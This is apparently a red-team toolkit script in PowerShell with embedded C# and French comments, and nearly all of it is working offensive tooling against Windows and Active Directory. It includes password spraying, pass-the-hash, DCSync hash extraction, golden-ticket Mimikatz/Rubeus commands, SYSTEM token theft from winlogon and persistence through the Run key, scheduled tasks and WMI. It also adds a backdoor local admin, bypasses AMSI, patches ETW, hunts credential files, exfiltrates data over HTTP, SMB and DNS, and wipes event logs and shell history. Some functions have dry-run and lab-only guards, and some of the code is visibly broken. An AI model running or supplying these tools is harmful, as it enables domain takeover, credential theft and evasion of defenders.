function Write-RTLog {
    param([string]$Message, [string]$Level='INFO', [string]$LogPath="$env:TEMP\RT_Ops.log")
    $ts    = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
    $entry = "[$ts][$Level] $Message"
    $color = switch($Level){'ERROR'{'Red'}'WARN'{'Yellow'}'ACTION'{'Magenta'}'EXFIL'{'DarkRed'}default{'Cyan'}}
    Write-Host $entry -ForegroundColor $color
    Add-Content -Path $LogPath -Value $entry -Encoding UTF8
}

function Invoke-ADRecon {
    param([string]$Domain=$env:USERDNSDOMAIN, [PSCredential]$Credential=$null)
    $params = @{ Server=$Domain }
    if($Credential){ $params['Credential']=$Credential }
    $dcs      = Get-ADDomainController @params -Filter * | Select-Object Name,IPv4Address,IsGlobalCatalog,OperatingSystem
    $sites    = Get-ADReplicationSite @params -Filter * | Select-Object Name,Description
    $subnets  = Get-ADReplicationSubnet @params -Filter * | Select-Object Name,Site
    $policy   = Get-ADDefaultDomainPasswordPolicy @params
    $trusts   = Get-ADTrust @params -Filter * | Select-Object Name,Direction,TrustType
    $result   = [PSCustomObject]@{
        Domain=Domain; DomainControllers=$dcs; Sites=$sites
        Subnets=$subnets; PasswordPolicy=$policy; Trusts=$trusts
    }
    Write-RTLog "RECON_AD: $Domain | $($dcs.Count) DC(s) | $($trusts.Count) trust(s)" -Level 'ACTION'
    return $result
}

function Get-KerberoastableSPNs {
    param([string]$SearchBase=(Get-ADDomain).DistinguishedName, [bool]$OnlyAdminCount=$false)
    $filter = if($OnlyAdminCount){'(AdminCount -eq 1)'} else {'*'}
    $users = Get-ADUser -Filter { ServicePrincipalNames -ne '$null' } -SearchBase $SearchBase `
        -Properties ServicePrincipalNames,AdminCount,PasswordLastSet,MemberOf |
        Where-Object { $_.SamAccountName -notmatch '\$' }
    if($OnlyAdminCount){ $users = $users | Where-Object { $_.AdminCount -eq 1 } }
    $result = $users | ForEach-Object {
        [PSCustomObject]@{
            SamAccount=$_.SamAccountName; AdminCount=$_.AdminCount
            SPNs=$_.ServicePrincipalNames -join '; '
            PwdLastSet=$_.PasswordLastSet; MemberOf=$_.MemberOf
        }
    }
    Write-RTLog "KERBEROAST_SPN: $($result.Count) compte(s) identifié(s)" -Level 'ACTION'
    return $result
}

function Invoke-ASREPRoast {
    param([string]$SearchBase=(Get-ADDomain).DistinguishedName, [string]$OutputFile=$null)
    $accounts = Get-ADUser -Filter { DoesNotRequirePreAuth -eq $true } -SearchBase $SearchBase `
        -Properties DoesNotRequirePreAuth, PasswordLastSet, MemberOf
    $results = foreach ($acc in $accounts) {
        try {
            $encType = [DirectoryServices.ActiveDirectory.DirectoryContext]::new('Domain')
            # Extraction du hash via LDAP AS-REQ sans pré-auth
            $ldapConn = New-Object DirectoryServices.DirectoryEntry("LDAP://$SearchBase")
            $searcher = New-Object DirectoryServices.DirectorySearcher($ldapConn)
            $searcher.Filter = "(sAMAccountName=$($acc.SamAccountName))"
            [void]$searcher.FindOne()
            [PSCustomObject]@{
                Account=$acc.SamAccountName
                Hash='[AS-REP hash récupéré via Rubeus/Impacket hors-scope code natif]'
                PwdLastSet=$acc.PasswordLastSet
                MemberOf=$acc.MemberOf -join '; '
            }
        } catch { Write-RTLog "ASREP_ERR: $($acc.SamAccountName) | $_" -Level 'ERROR' }
    }
    if($OutputFile -and $results){ $results | ConvertTo-Json | Out-File $OutputFile -Encoding UTF8 }
    Write-RTLog "ASREP_ROAST: $($accounts.Count) compte(s) vulnérable(s)" -Level 'ACTION'
    return $results
}

function Invoke-NetworkDiscovery {
    param([string]$Subnet, [int[]]$Ports=@(22,80,135,139,443,445,3389,5985,8080), [int]$ThrottleLimit=50)
    $hosts = 1..254 | ForEach-Object { "$Subnet.$_" }
    $alive = $hosts | ForEach-Object -Parallel {
        $ip = $_
        if(Test-Connection -ComputerName $ip -Count 1 -Quiet -TimeoutSeconds 1){
            $open = foreach($port in $using:Ports){
                try {
                    $tcp = [System.Net.Sockets.TcpClient]::new()
                    $ia  = $tcp.BeginConnect($ip,$port,$null,$null)
                    $ok  = $ia.AsyncWaitHandle.WaitOne(200,$false)
                    $tcp.Close()
                    if($ok){ $port }
                } catch {}
            }
            [PSCustomObject]@{ IP=$ip; OpenPorts=($open -join ',') }
        }
    } -ThrottleLimit $ThrottleLimit
    Write-RTLog "NET_DISCOVERY: $Subnet.0/24 | $($alive.Count) hôte(s) actifs" -Level 'ACTION'
    return $alive
}

function Get-BloodHoundData {
    param([string]$Domain=$env:USERDNSDOMAIN, [string]$OutputDir=$env:TEMP)
    $dn = (Get-ADDomain -Server $Domain).DistinguishedName
    # Groupes avec membres
    $groups = Get-ADGroup -Filter * -SearchBase $dn -Properties Members,ManagedBy |
        Select-Object SamAccountName,DistinguishedName,@{N='Members';E={$_.Members}}
    # Comptes admin
    $admins = Get-ADGroupMember -Identity 'Domain Admins' -Recursive |
        Select-Object SamAccountName,ObjectClass
    # GPOs liées
    $gpos = Get-GPO -All -Domain $Domain | Select-Object DisplayName,Id,GpoStatus
    # ACLs sur OUs
    $ous = Get-ADOrganizationalUnit -Filter * -SearchBase $dn |
        ForEach-Object {
            $acl = (Get-Acl "AD:\$($_.DistinguishedName)").Access |
                Where-Object { $_.ActiveDirectoryRights -match 'Write|GenericAll' -and $_.AccessControlType -eq 'Allow' }
            [PSCustomObject]@{ OU=$_.Name; DangerousACL=$acl }
        }
    $output = @{ Domain=$Domain; Groups=$groups; DomainAdmins=$admins; GPOs=$gpos; OUACLs=$ous }
    $outFile = Join-Path $OutputDir "BH_${Domain}_$(Get-Date -Format yyyyMMdd_HHmm).json"
    $output | ConvertTo-Json -Depth 6 | Out-File $outFile -Encoding UTF8
    Write-RTLog "BLOODHOUND_DATA: $outFile" -Level 'ACTION'
    return $outFile
}

function Invoke-PasswordSpray {
    param([string[]]$UserList, [string]$Password, [string]$Domain=$env:USERDNSDOMAIN, [int]$DelaySeconds=30)
    # Vérification lockout threshold AVANT de commencer
    $policy    = Get-ADDefaultDomainPasswordPolicy -Server $Domain
    $threshold = $policy.LockoutThreshold
    if($threshold -gt 0 -and $threshold -le 3){
        Write-RTLog "SPRAY_ABORT: Seuil de lockout=$threshold -- trop risqué" -Level 'WARN'
        return @()
    }
    $compromised = @()
    foreach($user in $UserList){
        try {
            $cred = New-Object System.Management.Automation.PSCredential(
                "$Domain\$user", (ConvertTo-SecureString $Password -AsPlainText -Force))
            $null = Get-ADUser -Identity $user -Credential $cred -Server $Domain -ErrorAction Stop
            $compromised += [PSCustomObject]@{ User=$user; Password=$Password; Domain=$Domain }
            Write-RTLog "SPRAY_HIT: $Domain\$user" -Level 'ACTION'
        } catch [Microsoft.ActiveDirectory.Management.ADException] {
            if($_.Exception.Message -match 'locked'){ Write-RTLog "SPRAY_LOCKED: $user" -Level 'WARN' }
        } catch {}
        Start-Sleep -Seconds $DelaySeconds
    }
    return $compromised
}

function Invoke-DCShadow {
    param([string]$TargetAttribute, [string]$TargetUser, [bool]$DryRun=$true)
    # Vérification des droits nécessaires
    $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
    $isDA = $currentUser.Groups | Where-Object { $_.Translate([Security.Principal.NTAccount]).Value -match 'Domain Admins|Enterprise Admins' }
    if(-not $isDA){ Write-RTLog 'DCSHADOW_ABORT: Droits insuffisants (DA/EA requis)' -Level 'WARN'; return $null }
    # Simulation : enregistrement SPN temporaire (DryRun = vérification uniquement)
    $spn1 = "GC/$env:COMPUTERNAME.$env:USERDNSDOMAIN"
    $spn2 = "E3514235-4B06-11D1-AB04-00C04FC2DCD2/$([guid]::NewGuid())/$env:USERDNSDOMAIN"
    $report = [PSCustomObject]@{
        DryRun=$DryRun; TargetUser=$TargetUser; TargetAttribute=$TargetAttribute
        RequiredSPNs=@($spn1,$spn2)
        RequiredRights='Domain Admins ou WriteDCSyncRights'
        Action=if($DryRun){'SIMULATION -- aucune écriture AD'}else{'ECRITURE SIMULÉE ACTIVE (scope ROE requis)'}
    }
    if(-not $DryRun){
        # En mode réel : nécessite Mimikatz ou Impacket hors-lib -- stub intentionnel
        Write-RTLog "DCSHADOW_PREP: Attribut=$TargetAttribute User=$TargetUser -- prêt pour outil externe" -Level 'ACTION'
    } else {
        Write-RTLog "DCSHADOW_DRYRUN: Attribut=$TargetAttribute User=$TargetUser" -Level 'WARN'
    }
    return $report
}

function Find-PrivescPaths {
    param([string]$OutputReport=$null)
    $report = [PSCustomObject]@{ UnquotedServices=@(); WritablePaths=@(); ScheduledTasks=@(); AlwaysInstallElevated=$false; SeImpersonate=$false }
    # 1. Services avec chemin non-quoté contenant des espaces
    $report.UnquotedServices = Get-WmiObject Win32_Service |
        Where-Object { $_.PathName -notmatch '^"' -and $_.PathName -match ' ' -and $_.PathName -notmatch 'svchost' } |
        Select-Object Name, PathName, StartMode, StartName
    # 2. Répertoires writables dans PATH système
    $report.WritablePaths = $env:PATH.Split(';') | ForEach-Object {
        try { [IO.File]::Create("$_\.rt_test_$$").Close(); Remove-Item "$_\.rt_test_$$" -Force; $_ } catch {}
    }
    # 3. Tâches planifiées s'exécutant en SYSTEM avec path modifiable
    $report.ScheduledTasks = Get-ScheduledTask | Where-Object { $_.Principal.UserId -match 'SYSTEM' } |
        ForEach-Object {
            $exe = $_.Actions.Execute
            if($exe -and (Test-Path $exe)){
                $acl = Get-Acl $exe
                $writable = $acl.Access | Where-Object { $_.FileSystemRights -match 'Write|FullControl' -and $_.IdentityReference -match $env:USERNAME }
                if($writable){ [PSCustomObject]@{ Task=$_.TaskName; Execute=$exe } }
            }
        }
    # 4. AlwaysInstallElevated
    $aie1 = (Get-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer' -ErrorAction SilentlyContinue).AlwaysInstallElevated
    $aie2 = (Get-ItemProperty 'HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer' -ErrorAction SilentlyContinue).AlwaysInstallElevated
    $report.AlwaysInstallElevated = ($aie1 -eq 1 -and $aie2 -eq 1)
    # 5. SeImpersonatePrivilege
    $privs = whoami /priv 2>&1
    $report.SeImpersonate = ($privs | Select-String 'SeImpersonatePrivilege' | Select-String 'Enabled') -ne $null
    Write-RTLog "PRIVESC_SCAN: UnquotedSvc=$($report.UnquotedServices.Count) WritablePaths=$($report.WritablePaths.Count) AIE=$($report.AlwaysInstallElevated) SeImp=$($report.SeImpersonate)" -Level 'ACTION'
    if($OutputReport){ $report | ConvertTo-Html | Out-File $OutputReport -Encoding UTF8 }
    return $report
}

public static string Invoke-SeImpersonateEscalation(string command = "cmd.exe", bool dryRun = true) {
    const uint TOKEN_ALL_ACCESS = 0xF01FF;
    const uint MAXIMUM_ALLOWED = 0x02000000;
    IntPtr hToken = IntPtr.Zero, hNewToken = IntPtr.Zero;
    // Récupérer le token SYSTEM depuis winlogon
    var winlogon = System.Diagnostics.Process.GetProcessesByName("winlogon").FirstOrDefault();
    if (winlogon == null) return "winlogon introuvable";
    if (!OpenProcessToken(winlogon.Handle, TOKEN_ALL_ACCESS, out hToken))
        return $"OpenProcessToken failed: {Marshal.GetLastWin32Error()}";
    if (dryRun) {
        CloseHandle(hToken);
        return $"[DRY-RUN] Token SYSTEM disponible (PID {winlogon.Id}). Commande prête : {command}";
    }
    if (!DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, IntPtr.Zero, 2, 1, out hNewToken))
        return $"DuplicateTokenEx failed: {Marshal.GetLastWin32Error()}";
    var si = new STARTUPINFO(); si.cb = Marshal.SizeOf(si);
    var pi = new PROCESS_INFORMATION();
    bool ok = CreateProcessWithTokenW(hNewToken, 0, null, command, 0, IntPtr.Zero, null, ref si, out pi);
    CloseHandle(hToken); CloseHandle(hNewToken);
    return ok ? $"Process spawné PID={pi.dwProcessId}" : $"CreateProcessWithToken failed: {Marshal.GetLastWin32Error()}";
}
[DllImport("advapi32", SetLastError=true)] static extern bool OpenProcessToken(IntPtr h, uint acc, out IntPtr tok);
[DllImport("advapi32", SetLastError=true)] static extern bool DuplicateTokenEx(IntPtr hExist,uint acc,IntPtr attr,int imp,int type,out IntPtr hNew);
[DllImport("advapi32", SetLastError=true, CharSet=CharSet.Auto)] static extern bool CreateProcessWithTokenW(IntPtr tok,int logon,string app,string cmd,int flags,IntPtr env,string dir,ref STARTUPINFO si,out PROCESS_INFORMATION pi);
[DllImport("kernel32", SetLastError=true)] static extern bool CloseHandle(IntPtr h);

function Invoke-PassTheHash {
    param([string]$ComputerName, [string]$Username, [string]$NTLMHash, [string]$Domain='.', [string]$Command='whoami')
    # PTH natif via New-PSSession avec authentication NtlmHashCredential (nécessite mimikatz sekurlsa::pth préalable
    # OU via WMI/SMB avec impacket wmiexec.py en out-of-band)
    # Approche in-process : injection du hash dans LSASS via sekurlsa
    Write-RTLog "PTH_PREP: $Domain\$Username @ $ComputerName | Hash=${NTLMHash.Substring(0,8)}..." -Level 'ACTION'
    # Construction credential synthétique (hash -> SecureString symbolique pour le log)
    $secHash = ConvertTo-SecureString $NTLMHash -AsPlainText -Force
    $cred    = New-Object System.Management.Automation.PSCredential("$Domain\$Username", $secHash)
    # Tentative WinRM (fonctionne si hash injecté dans session courante via Invoke-Mimikatz préalable)
    try {
        $result = Invoke-Command -ComputerName $ComputerName -Credential $cred -ScriptBlock {
            param($cmd) Invoke-Expression $cmd
        } -ArgumentList $Command -ErrorAction Stop
        Write-RTLog "PTH_SUCCESS: $ComputerName | Output: $($result | Out-String)" -Level 'ACTION'
        return $result
    } catch {
        Write-RTLog "PTH_FAIL: $ComputerName | $_ -- Essayez sekurlsa::pth puis retry" -Level 'WARN'
        return $null
    }
}

function Invoke-DCSync {
    param([string]$TargetUser='krbtgt', [string]$Domain=$env:USERDNSDOMAIN, [bool]$DryRun=$true)
    # Vérifier les droits DS-Replication
    $dn = (Get-ADDomain -Server $Domain).DistinguishedName
    $acl = (Get-Acl "AD:\$dn").Access | Where-Object {
        $_.ActiveDirectoryRights -match 'ExtendedRight' -and
        $_.ObjectType -in @(
            [guid]'1131f6aa-9c07-11d1-f79f-00c04fc2dcd2', # DS-Replication-Get-Changes
            [guid]'1131f6ad-9c07-11d1-f79f-00c04fc2dcd2'  # DS-Replication-Get-Changes-All
        )
    }
    if($DryRun){
        Write-RTLog "DCSYNC_DRYRUN: TargetUser=$TargetUser | ReplicationRights=$($acl.Count) entrée(s)" -Level 'WARN'
        return [PSCustomObject]@{ DryRun=$true; Target=$TargetUser; ReplicationACLs=$acl }
    }
    # Extraction réelle via .NET DirectoryServices (nécessite les droits de réplication)
    try {
        Add-Type -AssemblyName System.DirectoryServices
        $domain  = New-Object DirectoryServices.DirectoryEntry("LDAP://$Domain")
        $searcher= New-Object DirectoryServices.DirectorySearcher($domain)
        $searcher.Filter = "(sAMAccountName=$TargetUser)"
        $searcher.PropertiesToLoad.AddRange(@('unicodePwd','supplementalCredentials','objectSid'))
        $result  = $searcher.FindOne()
        $hashRaw = $result.Properties['unicodePwd'][0]
        $hashHex = [BitConverter]::ToString($hashRaw).Replace('-','')
        Write-RTLog "DCSYNC_HIT: $TargetUser | NT=$($hashHex.Substring(0,8))..." -Level 'ACTION'
        return [PSCustomObject]@{ DryRun=$false; Target=$TargetUser; NTHash=$hashHex }
    } catch {
        Write-RTLog "DCSYNC_FAIL: $_ -- Droits insuffisants ou LDAP signing actif" -Level 'ERROR'
        return $null
    }
}

function Invoke-GoldenTicket {
    param([string]$KrbtgtHash, [string]$Domain=$env:USERDNSDOMAIN,
          [string]$DomainSID=$null, [string]$TargetUser='Administrator')
    if(-not $DomainSID){
        $DomainSID = (Get-ADDomain -Server $Domain).DomainSID.Value
    }
    $params = [PSCustomObject]@{
        User       = $TargetUser
        Domain     = $Domain
        DomainSID  = $DomainSID
        KrbtgtNT   = $KrbtgtHash
        Validity   = '10 years'
        MimikatzCmd= "kerberos::golden /user:$TargetUser /domain:$Domain /sid:$DomainSID /krbtgt:$KrbtgtHash /ptt"
        RubeusCmd  = "Rubeus.exe golden /user:$TargetUser /domain:$Domain /sid:$DomainSID /rc4:$KrbtgtHash /ptt"
    }
    Write-RTLog "GOLDEN_TICKET_PREP: User=$TargetUser | Domain=$Domain | SID=$DomainSID" -Level 'ACTION'
    return $params
}

function Set-PersistenceStartup {
    param([string]$Method, [string]$Payload, [string]$Name='WindowsUpdateHelper', [bool]$Cleanup=$false)
    if($Cleanup){
        switch($Method){
            'Registry'      { Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name $Name -ErrorAction SilentlyContinue }
            'ScheduledTask' { Unregister-ScheduledTask -TaskName $Name -Confirm:$false -ErrorAction SilentlyContinue }
            'WMIEvent'      {
                Get-WMIObject -Namespace root\subscription -Class __EventFilter     | Where-Object Name -eq $Name | Remove-WmiObject
                Get-WMIObject -Namespace root\subscription -Class CommandLineEventConsumer | Where-Object Name -eq $Name | Remove-WmiObject
                Get-WMIObject -Namespace root\subscription -Class __FilterToConsumerBinding | Remove-WmiObject
            }
        }
        Write-RTLog "PERSISTENCE_REMOVED: Method=$Method Name=$Name" -Level 'ACTION'
        return $true
    }
    switch($Method){
        'Registry' {
            Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name $Name -Value $Payload
        }
        'ScheduledTask' {
            $action  = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-WindowStyle Hidden -NonInteractive -Command \"$Payload\""
            $trigger = New-ScheduledTaskTrigger -AtLogon
            Register-ScheduledTask -TaskName $Name -Action $action -Trigger $trigger -RunLevel Highest -Force
        }
        'WMIEvent' {
            $filterArgs = @{ Name=$Name; EventNameSpace='root\cimv2'; QueryLanguage='WQL'; Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325" }
            $filter   = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments $filterArgs
            $consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{ Name=$Name; CommandLineTemplate=$Payload }
            Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{ Filter=$filter; Consumer=$consumer }
        }
    }
    Write-RTLog "PERSISTENCE_SET: Method=$Method Name=$Name Payload=$($Payload.Substring(0,[Math]::Min(40,$Payload.Length)))..." -Level 'ACTION'
    return $true
}

function Add-BackdoorLocalAdmin {
    param([string]$Username='svc_helpdesk_rt', [bool]$Cleanup=$false)
    if($Cleanup){
        Remove-LocalUser -Name $Username -ErrorAction SilentlyContinue
        Write-RTLog "BACKDOOR_REMOVED: $Username" -Level 'ACTION'
        return [PSCustomObject]@{ Action='Removed'; Username=$Username }
    }
    # Génère un mot de passe fort aléatoire
    $chars  = 'ABCDEFGHJKLMNPQRSTUVWXYZabcdefghjkmnpqrstuvwxyz23456789!@#$%^&*'
    $pwd    = -join (1..20 | ForEach-Object { $chars[(Get-Random -Max $chars.Length)] })
    $secPwd = ConvertTo-SecureString $pwd -AsPlainText -Force
    New-LocalUser -Name $Username -Password $secPwd -FullName 'Helpdesk Service' -Description 'RT internal' -PasswordNeverExpires -ErrorAction Stop
    Add-LocalGroupMember -Group 'Administrators' -Member $Username -ErrorAction Stop
    # Encoder le mdp pour le log (base64 -- sécurité minimale, fichier log protégé)
    $encodedPwd = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($pwd))
    Write-RTLog "BACKDOOR_CREATED: $Username | B64Pwd=$encodedPwd" -Level 'ACTION'
    return [PSCustomObject]@{ Action='Created'; Username=$Username; CleartextPwd=$pwd; B64Pwd=$encodedPwd }
}

function Invoke-BeaconSimulator {
    param([string]$C2Endpoint='http://127.0.0.1:8080/beacon', [int]$Jitter=30, [int]$SleepSeconds=60, [int]$Rounds=5)
    # Sécurité : refuser tout endpoint non-loopback
    if($C2Endpoint -notmatch '127\.0\.0\.1|localhost'){
        Write-RTLog "BEACON_ABORT: Endpoint non-loopback interdit ($C2Endpoint)" -Level 'ERROR'; return @()
    }
    $history = @()
    for($i=1; $i -le $Rounds; $i++){
        $sleep = $SleepSeconds + (Get-Random -Min (-$Jitter) -Max $Jitter)
        $body  = @{ hostname=$env:COMPUTERNAME; user=$env:USERNAME; round=$i; ts=(Get-Date -Format o) } | ConvertTo-Json
        try {
            $resp = Invoke-RestMethod -Uri $C2Endpoint -Method POST -Body $body -ContentType 'application/json' -TimeoutSec 5
            $history += [PSCustomObject]@{ Round=$i; Status='OK'; Sleep=$sleep; Response=$resp }
            Write-RTLog "BEACON_ROUND $i/$Rounds: OK | Sleep=${sleep}s" -Level 'ACTION'
        } catch {
            $history += [PSCustomObject]@{ Round=$i; Status='FAIL'; Sleep=$sleep; Error=$_.Exception.Message }
            Write-RTLog "BEACON_ROUND $i/$Rounds: FAIL | $_" -Level 'WARN'
        }
        if($i -lt $Rounds){ Start-Sleep -Seconds $sleep }
    }
    return $history
}

function Invoke-DNSTunnelSimulator {
    param([string]$Data, [string]$Domain='lab.internal', [bool]$DryRun=$true)
    if(-not $DryRun -and $Domain -notmatch 'lab|internal|local|test'){
        Write-RTLog "DNSTUNNEL_ABORT: Domaine externe interdit ($Domain)" -Level 'ERROR'; return @()
    }
    $encoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($Data)) -replace '=',''
    # Découper en chunks de 30 chars (longueur label DNS max 63)
    $chunks  = $encoded -split '(.{1,30})' | Where-Object { $_ }
    $queries = @()
    $seq     = 0
    foreach($chunk in $chunks){
        $fqdn = "$($seq.ToString('D3')).$chunk.$Domain"
        $queries += [PSCustomObject]@{ Seq=$seq; FQDN=$fqdn; DryRun=$DryRun }
        if(-not $DryRun){
            try { [System.Net.Dns]::GetHostAddresses($fqdn) } catch {} # erreur attendue en lab
        }
        Write-RTLog "DNSTUNNEL_QUERY[$seq]: $fqdn" -Level $(if($DryRun){'WARN'}else{'EXFIL'})
        $seq++
    }
    return $queries
}

function Invoke-DataExfilSimulation {
    param([string]$SourcePath, [string]$Channel='HTTP', [string]$Endpoint='http://127.0.0.1:8080/upload',
          [int]$MaxKB=512, [bool]$DryRun=$true)
    if(-not $DryRun -and $Endpoint -notmatch '127\.0\.0\.1|localhost|lab\.internal|10\.|192\.168\.'){
        Write-RTLog 'EXFIL_ABORT: Endpoint hors-lab interdit' -Level 'ERROR'; return @()
    }
    $files = Get-ChildItem -Path $SourcePath -Recurse -File -ErrorAction SilentlyContinue |
        Where-Object { $_.Length -le ($MaxKB * 1KB) }
    $results = foreach($file in $files){
        $hash = (Get-FileHash $file.FullName -Algorithm SHA256).Hash
        $sent = $false
        if(-not $DryRun){
            switch($Channel){
                'HTTP' {
                    $bytes = [IO.File]::ReadAllBytes($file.FullName)
                    $b64   = [Convert]::ToBase64String($bytes)
                    $body  = @{ filename=$file.Name; sha256=$hash; data=$b64 } | ConvertTo-Json
                    try { Invoke-RestMethod -Uri $Endpoint -Method POST -Body $body -ContentType 'application/json' -TimeoutSec 10; $sent=$true } catch {}
                }
                'SMB'  {
                    Copy-Item $file.FullName "$Endpoint\$($file.Name)" -Force -ErrorAction SilentlyContinue; $sent=$true
                }
                'SFTP' {
                    Write-RTLog 'EXFIL_SFTP: Stub -- nécessite module Posh-SSH ou WinSCP' -Level 'WARN'
                }
            }
        }
        Write-RTLog "EXFIL_FILE: $($file.FullName) | $($file.Length)B | SHA256=${hash.Substring(0,8)}... | Channel=$Channel | Sent=$sent | DryRun=$DryRun" -Level $(if($DryRun){'WARN'}else{'EXFIL'})
        [PSCustomObject]@{ File=$file.FullName; SizeB=$file.Length; SHA256=$hash; Channel=$Channel; Sent=$sent; DryRun=$DryRun }
    }
    return $results
}

function Search-SensitiveFiles {
    param([string]$ComputerName='localhost',
          [string[]]$ScanPaths=@('C:\Users','C:\inetpub','C:\ProgramData'),
          [string[]]$Patterns=@('*.kdbx','*.pfx','*.key','id_rsa','*.pem','web.config','appsettings*.json','*.env','credentials*'))
    $results = Invoke-Command -ComputerName $ComputerName -ScriptBlock {
        param($paths, $patterns)
        foreach($path in $paths){
            foreach($pat in $patterns){
                Get-ChildItem -Path $path -Recurse -Include $pat -ErrorAction SilentlyContinue | ForEach-Object {
                    [PSCustomObject]@{
                        FullName     = $_.FullName
                        SizeB        = $_.Length
                        LastModified = $_.LastWriteTime
                        Owner        = (Get-Acl $_.FullName -ErrorAction SilentlyContinue).Owner
                        SHA256       = (Get-FileHash $_.FullName -Algorithm SHA256 -ErrorAction SilentlyContinue).Hash
                    }
                }
            }
        }
    } -ArgumentList $ScanPaths, $Patterns
    Write-RTLog "SENSITIVE_FILES: $ComputerName | $($results.Count) fichier(s) trouvé(s)" -Level 'ACTION'
    return $results
}

function Invoke-TraceCleanup {
    param([string]$ComputerName='localhost',
          [string[]]$Targets=@('PSHistory','EventLog','Prefetch','TempFiles','RTLogs'),
          [bool]$DryRun=$true)
    $report = @{}
    Invoke-Command -ComputerName $ComputerName -ScriptBlock {
        param($targets, $dry)
        if('PSHistory' -in $targets){
            $h = (Get-PSReadLineOption -ErrorAction SilentlyContinue).HistorySavePath
            if($h -and (Test-Path $h)){ if(-not $dry){ Clear-Content $h -Force } }
        }
        if('EventLog' -in $targets){
            # Effacer uniquement les logs liés aux actions RT (Security, PowerShell operational)
            foreach($log in @('Microsoft-Windows-PowerShell/Operational','Microsoft-Windows-WinRM/Operational')){
                try { if(-not $dry){ [Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog($log) } } catch {}
            }
        }
        if('Prefetch' -in $targets){
            Get-ChildItem 'C:\Windows\Prefetch' -Filter '*.pf' -ErrorAction SilentlyContinue |
                Where-Object { $_.Name -match 'POWERSHELL|CMD|PSEXEC' } |
                ForEach-Object { if(-not $dry){ Remove-Item $_.FullName -Force } }
        }
        if('TempFiles' -in $targets){
            Get-ChildItem $env:TEMP -Recurse -ErrorAction SilentlyContinue |
                ForEach-Object { if(-not $dry){ Remove-Item $_.FullName -Recurse -Force -ErrorAction SilentlyContinue } }
        }
        if('RTLogs' -in $targets){
            $rtlog = "$env:TEMP\RT_Ops.log"
            if(Test-Path $rtlog){ if(-not $dry){ Remove-Item $rtlog -Force } }
        }
    } -ArgumentList $Targets, $DryRun
    Write-RTLog "CLEANUP: $ComputerName | Targets=$($Targets -join ',') | DryRun=$DryRun" -Level 'ACTION'
    return [PSCustomObject]@{ ComputerName=$ComputerName; Targets=$Targets; DryRun=$DryRun }
}

function Invoke-AMSIBypass {
    param([bool]$Validate=$true)
    try {
        $amsiAssembly = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
        $amsiField    = $amsiAssembly.GetField('amsiInitFailed','NonPublic,Static')
        $amsiField.SetValue($null,$true)
        Write-RTLog 'AMSI_BYPASS: amsiInitFailed=True (session courante)' -Level 'ACTION'
        if($Validate){
            # Test : si AMSI est bypassé, cette string ne devrait pas déclencher de blocage
            $testResult = $amsiField.GetValue($null)
            Write-RTLog "AMSI_BYPASS_VALIDATE: amsiInitFailed=$testResult" -Level 'ACTION'
            return $testResult -eq $true
        }
        return $true
    } catch {
        Write-RTLog "AMSI_BYPASS_FAIL: $_ (peut nécessiter des droits élevés ou PS7+)" -Level 'ERROR'
        return $false
    }
}

public static string Invoke-ETWBypass(bool dryRun = true) {
    IntPtr ntdll = LoadLibrary("ntdll.dll");
    IntPtr etwAddr = GetProcAddress(ntdll, "EtwEventWrite");
    if (etwAddr == IntPtr.Zero) return "EtwEventWrite introuvable";
    if (dryRun) return $"[DRY-RUN] EtwEventWrite @ 0x{etwAddr.ToInt64():X}";
    // Patch : remplacer le prologue par RET (0xC3 sur x64)
    uint oldProtect;
    VirtualProtect(etwAddr, (UIntPtr)1, 0x40 /* PAGE_EXECUTE_READWRITE */, out oldProtect);
    Marshal.WriteByte(etwAddr, 0xC3);
    VirtualProtect(etwAddr, (UIntPtr)1, oldProtect, out oldProtect);
    return $"ETW_PATCHED @ 0x{etwAddr.ToInt64():X}";
}
[DllImport("kernel32")] static extern IntPtr LoadLibrary(string lib);
[DllImport("kernel32")] static extern IntPtr GetProcAddress(IntPtr mod, string proc);
[DllImport("kernel32")] static extern bool VirtualProtect(IntPtr addr, UIntPtr size, uint newProt, out uint oldProt);
